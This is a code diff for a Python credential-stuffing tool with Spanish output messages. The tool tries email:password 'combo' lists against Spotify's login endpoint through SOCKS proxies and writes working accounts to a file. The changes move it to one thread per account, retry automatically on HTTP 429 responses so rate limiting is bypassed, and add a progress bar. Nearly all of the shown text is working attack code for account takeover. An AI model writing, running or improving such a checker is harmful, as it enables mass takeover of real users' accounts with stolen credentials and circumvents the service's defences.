@@ -3,11 +3,13 @@ import threading
 from colorama import Fore, init
 import os, sys
 import socket, time
+from tqdm import tqdm
 import ssl, json
 
 init()
 
 ACCOUNTS = []
+OT = []
 
 def header():
     print(r'''
@@ -20,7 +22,7 @@ def header():
    |\_________\|__|     \|_______|    \|__|  \|_______|\|__|\|__|\|_______|\|_______|\|__| \|__|
    \|_________|                                                                                 
  
-By MrSentex | @fbi_sentex | www.github.com/MrSentex | www.gitlab.com/MrSentex | v0.2-Beta
+By MrSentex | @fbi_sentex | www.github.com/MrSentex | www.gitlab.com/MrSentex | v0.3-Beta
 ''')
 
 class colors:
@@ -70,19 +72,22 @@ Cookie: fb_continue=https%3A%2F%2Fwww.spotify.com%2Fid%2Faccount%2Foverview%2F; 
 remember=true&username={}&password={}&csrf_token={}'''.format(str(len('remember=true&username={}&password={}&csrf_token={}'.format(username, password, csrf_token))), csrf_token, username, password, csrf_token).encode()
 
 def make_post(account, csrf_token):
-    no_ssl_socket = socks.socksocket()
-    ssl_socket = ssl.wrap_socket(no_ssl_socket, ssl_version=ssl.PROTOCOL_SSLv23)
 
-    ssl_socket.connect(('accounts.spotify.com', 443))
-    ssl_socket.sendall(post_data(account[0], account[1], csrf_token))
-    api_data = ssl_socket.recv(10000)
-    api_data_plain = plain_http_request_to_json(api_data)
-    return api_data_plain
+    while True:
+        no_ssl_socket = socks.socksocket()
+        ssl_socket = ssl.wrap_socket(no_ssl_socket, ssl_version=ssl.PROTOCOL_SSLv23)
+
+        ssl_socket.connect(('accounts.spotify.com', 443))
+        ssl_socket.sendall(post_data(account[0], account[1], csrf_token))
+        api_data = ssl_socket.recv(10000)
+        if '429 Too' in api_data.decode():
+            time.sleep(1)
+            continue
+        api_data_plain = plain_http_request_to_json(api_data)
+        return api_data_plain
 
 def output(email, password):
-    with open(args.output, 'a') as ot:
-        ot.write(email+':'+password+'\n')
-        ot.close()
+    OT.append([email, password])
 
 def load_list(list):
     colors.info('Cargando combo...')
@@ -106,27 +111,23 @@ def load_list(list):
 
 def check_account(account):
     try:
-        no_ssl_socket = socks.socksocket()
-        ssl_socket = ssl.wrap_socket(no_ssl_socket, ssl_version=ssl.PROTOCOL_SSLv23)
-        ssl_socket.connect(('accounts.spotify.com', 443))
-        ssl_socket.sendall(b'GET / HTTP/1.1\r\nHost: accounts.spotify.com\r\n\r\n')
-        spotify_cookies_data = ssl_socket.recv(10000)
-        if '429 Too' in spotify_cookies_data.decode():
-            time.sleep(2)
+        while True:
             no_ssl_socket = socks.socksocket()
             ssl_socket = ssl.wrap_socket(no_ssl_socket, ssl_version=ssl.PROTOCOL_SSLv23)
             ssl_socket.connect(('accounts.spotify.com', 443))
             ssl_socket.sendall(b'GET / HTTP/1.1\r\nHost: accounts.spotify.com\r\n\r\n')
             spotify_cookies_data = ssl_socket.recv(10000)
+            if '429 Too' in spotify_cookies_data.decode():
+                time.sleep(1)
+                continue
+            else:
+                break
     except Exception as e:
         colors.error('Error! | '+str(e))
         sys.exit()
     csrf_token = get_csrf_token(spotify_cookies_data)
     if true_or_false_json(make_post(account, csrf_token)):
-        print('['+ Fore.GREEN  + account[0] + Fore.RESET + ']')
         output(account[0], account[1])
-    else:
-        print('['+ Fore.RED + account[0] + Fore.RESET + ']')
 
 def thread(list_):
     for email, password in list_:
@@ -136,26 +137,27 @@ def start():
     s_time = time.time()
     load_list(args.combo)
     if not args.nothreads:
-        try:
-            n = len(ACCOUNTS)
-            account1 = ACCOUNTS[1:n // 2]
-            account2 = ACCOUNTS[n // 2:n]
-            threads = []
-            t0 = threading.Thread(target=thread, args=(account1,))
-            t1 = threading.Thread(target=thread, args=(account2,))
-            threads.append(t0)
-            threads.append(t1)
-            for x in threads:
-                x.start()
-            for x in threads:
-                x.join()
-        except Exception:
-            thread(ACCOUNTS)
+        
+        threads = []
+        for account in ACCOUNTS:
+            t = threading.Thread(target=check_account, args=(account, ))
+            threads.append(t)
+        for x in threads:
+            x.start()
+        r = 0
+        for i in tqdm(range(int(len(threads))), ascii=True, desc="Procesando"):
+            threads[r].join()
+            r+=1
+
+        with open(args.output, 'w') as output:
+            for x in OT:
+                output.write(x[0] + ':' + x[1] + '\n')
+        output.close()
+
     else:
         thread(ACCOUNTS)
     print('')
     colors.correct('Se han procesado {} cuentas en {} segundos'.format(str(len(ACCOUNTS)), str(time.time() - s_time).split('.')[0]))
-
 clear()
 header()
 parser = argparse.ArgumentParser()
